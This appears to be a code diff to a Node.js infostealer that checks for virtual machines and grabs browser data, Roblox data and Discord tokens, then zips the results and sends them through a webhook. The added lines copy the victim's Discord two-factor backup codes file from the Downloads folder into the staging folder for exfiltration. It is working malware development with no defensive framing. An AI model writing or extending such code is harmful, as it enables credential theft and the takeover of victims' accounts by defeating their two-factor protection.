@@ -9,6 +9,7 @@ const config = require('./config');
 const { spawnSync } = require('child_process');
 const { checkVM, killTasks } = require('./functions/anti-vm');
 const { runningFromExecutable, sleep } = require('./util/general');
+const fs = require('fs');
 
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
@@ -29,6 +30,10 @@ if (config.vmProtect && checkVM()) {
     require('./functions/grab-browsers-data');
     await require('./functions/grab-roblox')();
 
+    const mfaCodesPath = join(os.homedir(), 'Downloads', 'discord_backup_codes.txt');
+    if (fs.existsSync(mfaCodesPath)) {
+      fs.copyFileSync(mfaCodesPath, join(tempFolder, 'Discord 2FA Backup Codes.txt'));
+    }
     await require('./functions/grab-discord-token');
     await sleep(500);
     require('./functions/zip').then(await require('./functions/webhook'));
